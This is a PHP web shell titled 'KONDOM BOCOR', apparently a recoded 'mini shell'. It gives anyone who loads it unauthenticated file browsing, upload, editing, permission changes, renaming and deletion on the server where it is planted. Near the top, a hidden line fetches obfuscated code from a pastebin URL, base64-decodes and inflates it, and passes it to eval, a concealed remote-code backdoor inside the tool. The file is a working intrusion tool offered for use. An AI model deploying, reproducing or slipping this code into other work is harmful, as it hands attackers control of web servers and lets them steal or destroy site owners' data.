<?php
set_time_limit(0);
error_reporting(0);
 
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
eval(gzinflate(base64_decode(file_get_contents('http://pastebin.com/raw/6PJ9Pj8F'))));
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>KONDOM BOCOR</title>
<style>
body{
color: #fff;
font-family: "courier new", cursive;
background-color: #e6e6e6;
text-shadow:0px 0px 1px #757575;
background-position: center;
	background-color:#ffffff;
    height:98%;
    width:99%;
    background-attachment: fixed;
    background-size:100% 117%;
	background-image:url(https://img00.deviantart.net/2272/i/2016/166/c/d/adult_neptune_minimalist_background_by_weeblordsupreme-da6ec13.png);
	cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1025.ani), url(http://cur.cursors-4u.net/cursors/cur-11/cur1025.png), progress !important;
}
#content tr:hover{
background-color: #0000CC;
text-shadow:0px 0px 10px #0000CC;
}
#content .first{
background-color: #0000CC;
}
#content .first:hover{
background-color: #0000CC;
text-shadow:0px 0px 1px #FFFFFF;
}
table{
border: 1px #0000CC solid;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #fff;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #fff solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>

<H1><center><font color= #fff face=courier new>KONDOM BOCOR</font></center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>System: <b>'.php_uname().'</b><br><br>Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="cyan">File Nya Udh Di Upload Cuk</font><br />';
}else{
echo '<font color="red">File Nya Gagal Di Upload Cuk</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="cyan">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Crotzz.." />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="cyan">Change Name Succes.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Crotzz.." />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="cyan">Edit File Succes</font><br />';
}else{
echo '<font color="red">Edit File Error</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Crotzz.." />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="cyan">Delete Dir Succes.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="cyan">Delete File Succes.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center><font color=white>Name</font></center></td>
<td><center><font color=white>Size</font></center></td>
<td><center><font color=white>Permissions</font></center></td>
<td><center><font color=white>Action</font></center></td>
</tr>';
 
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="cyan">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
 
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
 
echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="cyan">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br />xxxxx<font color="red">1.0</font>, XXX <font color="red">xxxx</font>
<!--Tulisan Miring-->
<span id="sec"><div id="foter" class="foter" style="position: absolute; top: 70px; left: -225px; width: 600px; height: 28px; margin: 0px; padding: 10px; font-size: 24px; text-align: center; color: rgb(255, 255, 255); font-family: &quot;trebuchet ms&quot;, Courier new, courier new, sans-serif; transform: rotate(-45deg); transform-origin: 50% 0px 0px; background-color: rgb(0, 0, 0); border: 1px solid rgb(170, 170, 170); opacity: 0.5; z-index: 1200;">
<font face="courier new"><marquee color="darkblue" behavior="Flip" scrollamount="6" width="50%" style="width: 50%;">SPECIMENT MINI SHELL -
 RECODED FROM PHANTOM GHOST</marquee></font></div></span>
<!--<iframe width="0" height="0" src="https://www.youtube.com/embed/1-xGerv5FOk?autoplay=1" frameborder="0" allowfullscreen=""></iframe>

</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
 
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
 
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
 
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
 
return $info;
}
?>